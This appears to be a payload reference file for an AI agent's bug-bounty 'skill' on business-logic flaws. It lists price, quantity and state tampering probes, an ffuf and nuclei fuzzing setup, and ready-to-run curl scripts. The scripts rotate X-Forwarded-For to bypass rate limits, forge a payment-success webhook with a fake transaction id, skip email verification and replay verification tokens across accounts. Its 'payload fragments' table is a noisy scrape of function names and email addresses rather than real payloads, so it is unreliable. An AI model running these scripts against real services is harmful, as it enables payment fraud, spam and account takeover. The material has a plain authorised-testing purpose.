# Logic And Design — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- Quantity -> `-1`, `0`, `0.001`, `1e9`, `NaN`, very long decimals

- Price -> change `price=100` to `price=1`, remove the field, send array

- State -> `status=approved`, `paid=true`, `step=3` out of order

- Race -> parallel redeem of the same coupon/withdrawal



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 7× | `Curl_httpsrr_applicable()` |

| 6× | `security@` |

| 6× | `(all)` |

| 5× | `wallet2::sign_tx(unsigned_tx_set &...)` |

| 5× | `gtsatsis@staff.ratelimited.me` |

| 5× | `hostmatch()` |

| 4× | `conn->ssl_config` |

| 4× | `$.extend` |

| 3× | `data:` |

| 3× | `__proto__` |

| 3× | `get_peer_type()` |

| 3× | `ossl_verifyhost()` |

| 3× | `conn_config->CRLfile` |

| 3× | `cr_init_backend()` |

| 2× | `x-request: %s` |

| 2× | `javascript:` |

| 2× | `%00` |

| 2× | `master @ 3ad4a5ee8` |

| 2× | `tester@test.com` |

| 2× | `h1test@example.com` |



## Parameters observed



`url` · `email` · `returnRoute` · `client_id` · `callback_url` · `signature` · `name` · `config` · `requestID` · `callback` · `source` · `load` · `amount` · `lang` · `baseUrl` · `targetOrigin` · `type` · `key` · `all_results` · `html`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_logic-and-design.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/params_logic-and-design.txt` | 150 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_logic-and-design.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_logic-and-design.txt \

     -mr 'canary|error|invalid|not found' -rate 40

```



## Nuclei



No scanner finds business-logic flaws. Use Nuclei for recon, then model the workflow manually.



```sh

nuclei -u https://target -tags vuln,exposure \

       -severity low,medium,high,critical -rl 40 -o nuclei_logic-and-design.txt

nuclei -u https://target -t ~/nuclei-templates/http/exposures \

       -rl 40 -o nuclei_logic-and-design_exposures.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.



## Payload & Detection Patterns



**Rate limit bypass via header rotation:**

```bash

# Rotate X-Forwarded-For to bypass IP rate limiting

for i in $(seq 1 100); do

  curl -s -X POST https://target.com/api/subscribe \

    -H "X-Forwarded-For: 10.0.0.$i" \

    -H "X-Real-IP: 10.0.0.$i" \

    -H "Content-Type: application/json" \

    -d '{"email":"victim+'"$i"'@example.com"}' \

    -o /dev/null -w "%{http_code}\n"

done

```



**Payment tampering — modify in-flight price:**

```http

POST /payment/initiate HTTP/1.1

Host: target.com



amount=0.01&currency=USD&order_id=12345&product_id=99

```

```bash

# Look for unvalidated webhook endpoints

curl -X POST https://target.com/payment/callback \

  -H "Content-Type: application/json" \

  -d '{"status":"success","amount":"0.01","order_id":"12345","transaction_id":"fake-txn"}'

```



**Unauthenticated internal page discovery:**

```bash

# Check robots.txt and sitemap for internal paths

curl -s https://target.com/robots.txt | grep -iE "(disallow|allow)" 

curl -s https://target.com/sitemap.xml | grep -iE "(employee|internal|staff|summit|admin)"



# Grep JS bundles for internal paths

curl -s https://target.com/assets/app.js | grep -oE '"/[a-zA-Z0-9/_-]{3,50}"' | sort -u

```



**Email verification bypass:**

```bash

# Skip the verification step: hit the post-verification API endpoint directly

# with an unverified session. If it succeeds, the gate is UI-only.

curl -s -X POST https://monitor.target.com/api/monitoring/enable \

  -H "Cookie: session=<your_unverified_session>" \

  -H "Content-Type: application/json" \

  -d '{"email":"victim@example.com"}'



# Replay verification token on different account

curl -X POST https://target.com/verify \

  -d 'token=VALID_TOKEN_FROM_ACCOUNT_A&email=account_b@example.com'

```



**Grep patterns for client-side logic issues:**

```bash

# Find price calculations in JS

grep -iE "(price|amount|total|cost)\s*[=*+]" app.js



# Find internal URLs in JS bundles

grep -oE '"/(employee|internal|staff|admin|summit)[^"]*"' *.js



# Find unvalidated IP header usage in server code

grep -iE "x-forwarded-for|x-real-ip|cf-connecting-ip" src/ -r

```



---
